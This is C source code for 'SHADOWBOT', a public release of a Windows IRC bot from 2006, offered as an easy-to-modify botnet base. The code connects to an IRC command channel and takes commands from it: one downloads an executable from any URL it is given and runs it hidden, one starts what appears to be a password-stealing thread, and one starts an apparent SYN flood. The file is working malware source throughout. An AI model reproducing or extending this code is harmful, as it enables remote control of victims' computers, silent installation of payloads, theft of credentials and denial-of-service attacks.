//
// SHADOWBOT public release. BY GHOST 0x90-team.net .us .ws .eu... -2006-
// very stable irc bot base coded for easy use.
// rex dont rip my base =) 
// basic & stable easy to modd bot . enjoy .

#include "inc.h"
#include "md5.h"
//######CONFIG######
char channel[20]= "#mychan";
char server[30]= "irc.xxxx.net";
int port = 6667;
char tesst[] = "9a8f1a144f97ff01b3602da757a65a70"; // md5hash ":d0wnload -> d0wnload"
//##################

int sleeptime = 12000;
SOCKET sock;
char user[50]= "lol lol lol :shadow";
char msg[256];

char *ardres(const char *addr)
{
topt:
	struct hostent *he = NULL;

	he = gethostbyname(addr);

	if (he==NULL) 
	{ 
		Sleep(sleeptime);
		goto topt;
	}
	 return inet_ntoa(*(struct in_addr *) he->h_addr_list[0]);
}

char *md5_str(char *p)
{
  md5_state_t state;
  md5_byte_t digest[16];
  char *hex_output = (char *)malloc(33);
  int di;
   
  md5_init(&state);
  md5_append(&state, (const md5_byte_t *)p, (int)strlen(p));
  md5_finish(&state, digest);
   
  for (di = 0; di < 16; di++){
    sprintf(hex_output + di * 2, "%02x", digest[di]);
  }   
  return hex_output;
}

char *rndx(int size)
{
	int k;
	char *buf;
	unsigned int ret;

	buf = (char *)malloc(size + 1);
	memset(buf, '\0', size + 1);
	srand((unsigned int)time(NULL));
	for (k = 0; k < size; k++)
	{
		ret = ((rand() % 26) + 97);
		strcat(buf, (const char *)&ret);
	}

	return buf;
}

int mageshit(char *link,char *exxe)
{
  FILE *fp;
  HINTERNET hOpen, hURL;
  char file[99];
  unsigned long read;
  PROCESS_INFORMATION pInfo;
   STARTUPINFO sInfo;
  memset(&sInfo, 0, sizeof(sInfo));
  memset(&pInfo, 0, sizeof(pInfo));
  sInfo.cb = sizeof(STARTUPINFO);
  sInfo.dwFlags = STARTF_USESHOWWINDOW;
  sInfo.wShowWindow = SW_HIDE;
  hOpen = InternetOpen("wget", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
  if (hOpen == NULL) 
	  return 0;
	else
  hURL = InternetOpenUrl( hOpen, link, NULL, 0, 0, 0 );
	  if (hURL == NULL) 
	  return 0;
	else
  fp = fopen(exxe, "wb");
	  if (fp!=NULL)
  {
  while(InternetReadFile(hURL, file, sizeof(file) - 1 , &read) && read != 0)
  {
     fwrite(file, sizeof(char), read, fp);
  }
  fclose(fp);
  CreateProcess(NULL, exxe, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo);
  return 1;
	  }
	  return 0;
}

void parseethafuck(char *commands) 
{
	char *btokens[10];
	char buffz[BUFSIZ];
	sprintf(buffz, commands);

	btokens[0] =strtok(commands," \r\n");
	for (int i=1;i<10;i++)
	{
		btokens[i]=strtok(NULL," \r\n");
	}

	if (strstr(btokens[3], "pstore"))
	{
		CreateThread(NULL, 0, &welcomebitch, 0, 0, 0);
	}
	if (strstr(btokens[3], "skysyn"))
	{
		SkyBye(btokens[4],btokens[5],btokens[6]);
	}

	//to parse all tha fucking strings
	/*if (strstr(btokens[3], "test"))
	{
		sprintf(buffz, btokens[4]);
	    for (int z=5;z<10;z++)
		{

		    strcat (buffz, " ");
		    if(btokens[z] != NULL)
              strcat (buffz, btokens[z]);
		}
        test(buffz, FALSE);

	}*/


	if (lstrcmpi(md5_str(btokens[3]), tesst) == 0)
	{
		 char fileto[MAX_PATH];
	     char *url;
	     url = btokens[4];	

	     strcpy(fileto,rndx(6));
	     strcat(fileto,".exe");

	     if (mageshit(url,fileto)) {
			 sprintf(msg, "PRIVMSG %s :Exec [%s]\n", channel, url);
	         send(sock, msg, strlen(msg), 0);
		 }

		 else
	 		 sprintf(msg, "PRIVMSG %s :Failed [%s]\n", channel, url);
		     send(sock, msg, strlen(msg), 0);
	 }
}

BOOL FlushDNSCache(void)
{
 	DFRC fDnsFlushResolverCache;
    DFRCEA fDnsFlushResolverCacheEntry_A;
    HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");
		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A);
	}

	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet = fDnsFlushResolverCache();

	return (bRet);
}

int main()
{
	HANDLE MutexHandle;
	MutexHandle = CreateMutex(0, 0, "shadowbotpublic");
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return(0);
	}
	struct sockaddr_in addr;
top:
	Sleep(5000);
	WSADATA WSAData;
	WSAStartup(MAKEWORD(1,0), &WSAData);
    char buffer[BUFSIZ];
	char msg[256],temp[10];
	char *ptr;
	addr.sin_addr.s_addr = inet_addr(ardres(server));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	while(connect(sock,(struct sockaddr*)&addr,sizeof(addr)))
	{
		FlushDNSCache();
		WSACleanup();
        closesocket(sock);
		goto top;
	}
	// **random nick shit **//
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	unsigned long total = GetTickCount() / (1000% 86400) / 3600;
	//////////////////////////
	HANDLE hFile, FileHandle;
	hFile = CreateFile("new.txt",
				GENERIC_READ,
				FILE_SHARE_READ,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		sprintf (buffer, "NICK new[%s][%iH]%s\n", temp, total, rndx(9));
		FileHandle = CreateFile("new.txt", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if(FileHandle != INVALID_HANDLE_VALUE)
           CloseHandle(FileHandle);
		CloseHandle(FileHandle);
		CloseHandle(hFile);
	} else sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
	CloseHandle(hFile);

	send (sock, buffer, strlen (buffer), 0);
	sprintf (buffer, "USER %s\n", user);
	send (sock, buffer, strlen (buffer), 0);
	Sleep(500);
	sprintf (buffer, "JOIN %s\n", channel);
	send (sock, buffer, strlen (buffer), 0);
	
	while (1) {

   	    memset(buffer, '\0', BUFSIZ); 

		if (recv(sock, buffer, BUFSIZ-1, 0) <= 0) 
		{

			WSACleanup();
            closesocket(sock);
			goto top;
		} else 

		printf("%s",buffer);
		if (strstr(buffer, "PING :"))
        {
            ptr = strstr(buffer, "PING :") + strlen("PING :");
            sprintf(msg, "PONG :%s\n", ptr);
            send(sock, msg, strlen(msg), 0);
        }
		if (strstr(buffer, "433"))
		{
		    sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(8));
		    send(sock, msg, strlen(msg), 0);
        }

		if (strstr(buffer, "404"))
        {
		    sprintf (msg, "JOIN %s\n", channel);
		    send(sock, msg, strlen(msg), 0);
        }

		if (strstr(buffer, "KICK"))
        {

		    sprintf (msg, "JOIN %s\n", channel);
		    send(sock, msg, strlen(msg), 0);
        }

		if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) 
		{
		    parseethafuck(buffer);
		}

	}
	WSACleanup();
    closesocket(sock);
 
    return 0;
}
